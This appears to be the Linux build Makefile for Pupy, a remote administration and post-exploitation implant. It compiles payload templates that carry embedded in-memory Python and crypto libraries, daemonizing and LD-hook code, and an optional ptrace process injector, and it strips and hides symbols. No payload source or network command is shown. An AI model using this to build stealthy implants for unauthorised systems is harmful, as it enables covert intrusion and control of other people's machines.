CC ?= gcc
PYMAJ ?= 3
PYMIN ?= 10

OS ?= $(shell uname -s)
MACH ?= $(shell uname -m)
SUFFIX ?= $(PYMAJ)$(PYMIN).$(shell echo $(OS) | cut -c -3 | tr '[:upper:]' '[:lower:]')

STATIC_LIBZ := -Wl,-Bstatic -lz -Wl,-Bdynamic
# STATIC_LIBZ := -lz

CFLAGS := $(shell pkg-config --cflags python-$(PYMAJ).$(PYMIN)) -I. -I../common -fPIC $(CFLAGS_EXTRA) -pipe -Wall
LDFLAGS := $(LDFLAGS) $(STATIC_LIBZ) -lpthread -ldl -fPIC $(LDFLAGS_EXTRA)
PFLAGS := -OO
PIE ?= -pie

CFLAGS += -D$(OS) -std=gnu99
CFLAGS += -DPYMAJ=$(PYMAJ) -DPYMIN=$(PYMIN)
CFLAGS += -DPYTHON_LIB_NAME="python$(PYMAJ)$(PYMIN).so"

ifeq ($(OPENSSL_LIB_VERSION),)
OPENSSL_LIB_VERSION := 1.0.0
endif

CFLAGS += "-DOPENSSL_LIB_VERSION=\"$(OPENSSL_LIB_VERSION)\""

ifeq ($(LIBPYTHON),)
LIBPYTHON := $(shell /sbin/ldconfig -p  | awk '/libpython$(PYMAJ).$(PYMIN).so/{print $$4}' | head -n 1)
endif

ifeq ($(LIBPYTHON_INC),)
#LIBPYTHON_INC := -I/root/.pyenv/versions/3.10.6/include/python3.10/
endif

ifeq ($(LIBCRYPTO),)
LIBCRYPTO := $(shell /sbin/ldconfig -p  | awk '/libcrypto.so.$(OPENSSL_LIB_VERSION)/{print $$4}' | head -n 1)
endif

ifeq ($(LIBSSL),)
LIBSSL := $(shell /sbin/ldconfig -p  | awk '/libssl.so.$(OPENSSL_LIB_VERSION)/{print $$4}' | head -n 1)
endif


ifeq ($(LIBFFI),)
LIBFFI := $(shell /sbin/ldconfig -p  | awk '/libffi.so.6/{print $$4}' | head -n1)
endif

XZARGS ?= "gcc" "aligned(0x1000)" 'section(".xzrodata")'

# Compatibility for old well-known platforms
ifneq ($(filter $(MACH), x86_64 i386 i486 i586 i686),)
MACHNAME :=

ifeq ($(ARCH),)
ARCH ?= $(shell file $(LIBPYTHON) | grep 32-bit >/dev/null && echo 32 || echo 64)
endif

ifeq ($(ARCH),64)
NAME := 64
LDFLAGS += -m64
ifeq ($(DEBUG),)
CFLAGS += -fvisibility=hidden
endif
else
NAME := 86
CFLAGS += -D_FILE_OFFSET_BITS=64
endif

NAME := x$(NAME)

else
NAME ?= $(MACH)
FEATURE_INJECTOR :=
endif

CFLAGS += -Iresources/$(MACH) -Iresources

LINUX_INJECT_CFLAGS := -include fixes.h -Iinjector/src/linux

ifneq ($(DEBUG),)
DEBUG_ADD := -debug
CFLAGS += -DDEBUG -O0 -g
LDFLAGS += -g
NAME := $(NAME)d
DEBUG_OBJS := debug.o
$(info BUILD debug with name $(NAME))
else
DEBUG_OBJS :=
CFLAGS += -Os
ifeq ($(OS),Linux)
LDFLAGS += -O1 -Wl,-s -Wl,-x -Wl,--gc-sections -Wl,--no-undefined
LDFLAGS += -Wl,-z,now -Wl,-z,combreloc -Wl,--enable-new-dtags
else
LDFLAGS += -s
endif
$(info BUILD non-debug with name $(NAME))
endif

ifneq ($(DEBUG_USE_OS_PYTHON),)
CFLAGS += -DDEBUG_USE_OS_PYTHON
endif

PYTHON ?= python3
TEMPLATE_OUTPUT_PATH ?= ../../pupy/payload_templates/

SHARED_OBJS := main_so.o tmplibrary_lmid.o pupy_load.o
SHARED_CFLAGS := -D_PUPY_SO
APP_OBJS := main_exe.o tmplibrary.o pupy_load.o
COMMON_OBJS := daemonize.o decompress.o
LOAD_DEPS := \
	resources/$(MACH)/libssl.c \
	resources/$(MACH)/libcrypto.c \
	resources/$(MACH)/libffi.c \
	resources/$(MACH)/python3x.c \
	resources/$(MACH)/library.c \
	import-tab.h revision.h


ifneq ($(FEATURE_PATHMAP),)
APP_OBJS += ld_hooks.o
SHARED_CFLAGS += -D_LD_HOOKS_NAME=\"ld_hooks_$(NAME).so\"
LOAD_DEPS += ld_hooks_$(NAME).c
LOAD_SHARED_CFLAGS := \
	-D_LD_HOOKS_NAME=\"ld_hooks_$(NAME).so\" \
	-D_LD_HOOKS_START=ld_hooks_$(NAME)_c_start \
	-D_LD_HOOKS_SIZE=ld_hooks_$(NAME)_c_size \
	-include "ld_hooks_$(NAME).c"
CFLAGS += -D_FEATURE_PATHMAP
endif

ifneq ($(DEBUG),)
COMMON_OBJS += $(DEBUG_OBJS)
CEXTFLAGS := --debug
endif

ifeq ($(UNCOMPRESSED),)
COMMON_OBJS += LzmaDec.o
COMPRESSED = 1
else
CFLAGS += -DUNCOMPRESSED
SUFFIX := unc-$(SUFFIX)
COMPRESSED = 0
endif

ifneq ($(FEATURE_INJECTOR),)
COMMON_OBJS += injector/src/linux/elf.o
COMMON_OBJS += injector/src/linux/injector.o
COMMON_OBJS += injector/src/linux/ptrace.o
COMMON_OBJS += injector/src/linux/remote_call.o
COMMON_OBJS += injector/src/linux/util.o
COMMON_OBJS += fixes.o

CFLAGS += -D_FEATURE_INJECTOR -Iinjector/include
LDFLAGS += -Wl,-wrap,realpath
endif

PUPY_LOAD_DEPS := \
	pupy_load.c \
	resources/$(MACH)/library.c \
	resources/$(MACH)/python3x.c \
	resources/$(MACH)/libssl.c \
	resources/$(MACH)/libcrypto.c \
	resources/$(MACH)/libffi.c \
	import-tab.c revision.h

all: $(TEMPLATE_OUTPUT_PATH)/pupy$(NAME)-$(SUFFIX) $(TEMPLATE_OUTPUT_PATH)/pupy$(NAME)-$(SUFFIX).so $(TEMPLATE_OUTPUT_PATH)/_pupy$(SUFFIX).so

revision.h:
	if [ x"$$COMMIT" = x"" ]; then rev=`cat ../../.git/\`cat ../../.git/HEAD | cut -f 2 -d \ \` | cut -c 1-8`; \
		else rev=$$COMMIT; fi; echo "#define GIT_REVISION_HEAD \"$$rev\"" >$@

debug.o: ../common/debug.c ../common/debug.h
	$(CC) -c -o $@ $< $(CFLAGS)

resources/$(MACH)/_pupy.so: build_c_ext.py revision.h pupy.c daemonize.c tmplibrary.c decompress.c ld_hooks.c
	$(PYTHON) build_c_ext.py build $(CEXTFLAGS)
	cp -f $(shell echo build/lib.linux-*/_pupy.*) resources/$(MACH)/_pupy.so

# pupy.o: revision.h ../common/jni_on_load.c ../common/Python-dynload.h import-tab.h $(PUPY_LOAD_DEPS) resources/$(MACH)/python3x.c 
#	$(CC) -c $(LIBPYTHON_INC) -o $@ $(CFLAGS) $(SHARED_CFLAGS) $<

main_so.o: main_so.c import-tab.h 
	$(CC) -c -o $@ $< $(CFLAGS) $(LOAD_SHARED_CFLAGS) 

main_exe.o:	main_exe.c import-tab.h 
	$(CC) $(CFLAGS) -c -o $@ $< 

pupy_load.o: pupy_load.c $(LOAD_DEPS) resources/$(MACH)/_pupy.c import-tab.h
	$(CC) -c -o $@ $< $(CFLAGS)

tmplibrary.o: tmplibrary.c
	$(CC) -c -o $@ $< $(CFLAGS)

tmplibrary_lmid.o: tmplibrary.c
	$(CC) -c -o $@ $< $(CFLAGS) -DWIP_LMID

import-tab.c import-tab.h: ../mktab.py
	$(PYTHON) $(PFLAGS) $< UCS4

ifeq ($(UNCOMPRESSED),)
LzmaDec.o: ../common/LzmaDec.c
	$(CC) $(CFLAGS) -O3 -fPIC -c -o $@ $<
endif

resources/$(MACH)/library.txt: ../gen_library_compressed_string.py resources/$(MACH)/library.zip
	$(PYTHON) $(PFLAGS) ../gen_library_compressed_string.py $@ resources/$(MACH)/library.zip

resources/$(MACH)/library.c: ../gen_resource_header.py resources/$(MACH)/library.txt resources/$(MACH)/library.zip
	$(PYTHON) $(PFLAGS) ../gen_resource_header.py resources/$(MACH)/library.txt $@ $(COMPRESSED) $(XZARGS)

ld_hooks_$(NAME).so: ld_hooks.c $(DEBUG_OBJS)
	$(CC) $(CFLAGS) -shared $+ -o $@ $(LDFLAGS) \
		-D_LD_HOOKS_NAME=\"$@\" \
		-Wl,-soname,$@ \
		-Wl,--no-undefined

ld_hooks_$(NAME).c: ../gen_resource_header.py ld_hooks_$(NAME).so
	$(PYTHON) $(PFLAGS) ../gen_resource_header.py ld_hooks_$(NAME).so $@ $(COMPRESSED) $(XZARGS)

injector/%.o: injector/%.c
	$(CC) -c $(LINUX_INJECT_CFLAGS) $(CFLAGS) -o $@ $<

resources/$(MACH)/python$(PYMAJ)$(PYMIN).so: $(LIBPYTHON)
	@mkdir -p resources/$(MACH)
	cp -f $< $@.tmp
	-chmod 600 $@.tmp
	-strip $@.tmp
	sed $@.tmp -e 's@/tmp@\x00tmp@g;s@/usr@\x00usr@g' >$@ || ( rm -f $@; cp $@.tmp $@ )
	rm -f $@.tmp

resources/$(MACH)/libcrypto.so: $(LIBCRYPTO)
	@mkdir -p resources/$(MACH)
	cp -f $< $@.tmp
	-chmod 600 $@.tmp
	-strip $@.tmp
	mv $@.tmp $@
	rm -f $@.tmp

resources/$(MACH)/libssl.so: $(LIBSSL)
	@mkdir -p resources/$(MACH)
	cp -f $< $@.tmp
	-chmod 600 $@.tmp
	-strip $@.tmp
	mv $@.tmp $@
	rm -f $@.tmp

resources/$(MACH)/libffi.so: $(LIBFFI)
	@mkdir -p resources/$(MACH)
	cp -f $< $@.tmp
	-chmod 600 $@.tmp
	-strip $@.tmp
	mv $@.tmp $@
	rm -f $@.tmp

resources/$(MACH)/library.zip: ../build_library_zip.py ../additional_imports.py
	$(PYTHON) -OO $(PFLAGS) $< $@

resources/$(MACH)/_pupy.c: ../gen_resource_header.py resources/$(MACH)/_pupy.so
	$(PYTHON) $(PFLAGS) $+ $@ $(COMPRESSED) $(XZARGS)

resources/$(MACH)/python3x.c: ../gen_resource_header.py resources/$(MACH)/python$(PYMAJ)$(PYMIN).so
	$(PYTHON) $(PFLAGS) $+ $@ $(COMPRESSED) $(XZARGS)

resources/$(MACH)/libssl.c: ../gen_resource_header.py resources/$(MACH)/libssl.so
	$(PYTHON) $(PFLAGS) $+ $@ $(COMPRESSED) $(XZARGS)

resources/$(MACH)/libcrypto.c: ../gen_resource_header.py resources/$(MACH)/libcrypto.so
	$(PYTHON) $(PFLAGS) $+ $@ $(COMPRESSED) $(XZARGS)

resources/$(MACH)/libffi.c: ../gen_resource_header.py resources/$(MACH)/libffi.so
	$(PYTHON) $(PFLAGS) $+ $@ $(COMPRESSED) $(XZARGS)

$(TEMPLATE_OUTPUT_PATH)/pupy$(NAME)-$(SUFFIX): $(APP_OBJS) $(COMMON_OBJS)
	$(CC) $(PIE) $+ -o $@ $(LDFLAGS) \
		-Wl,--version-script=pupy.ldscript \
		-Wl,--export-dynamic

$(TEMPLATE_OUTPUT_PATH)/pupy$(NAME)-$(SUFFIX).so: $(SHARED_OBJS) $(COMMON_OBJS)
	$(CC) -shared $+ -o $@ $(LDFLAGS) -Wl,-soname,pupy$(NAME)-$(SUFFIX).so \
		-Wl,--version-script=pupy.so.ldscript

$(TEMPLATE_OUTPUT_PATH)/_pupy$(SUFFIX).so: resources/$(MACH)/_pupy.so
	cp resources/$(MACH)/_pupy.so $(TEMPLATE_OUTPUT_PATH)/_pupy$(SUFFIX).so

.PHONY: clean all

clean:
	rm -f $(COMMON_OBJS) $(PYOBJS)
	rm -f pupy pupy.so
	rm -f *.o
	rm -f resources/$(MACH)/_pupy.so
	rm -f resources/$(MACH)/_pupy.c
	rm -rf build

distclean: clean
	rm -f resources/*.c
	rm -f resources/$(MACH)/*.c
	rm -f resources/$(MACH)/_pupy.so
	rm -f ld_hooks_$(NAME).c
	rm -f ld_hooks_$(NAME).so
	rm -f import-tab.c
	rm -f import-tab.h
	rm -f revision.h
	rm -rf resources
	rm -rf build

$(COMMON_OBJS) $(PYOBJS): import-tab.h
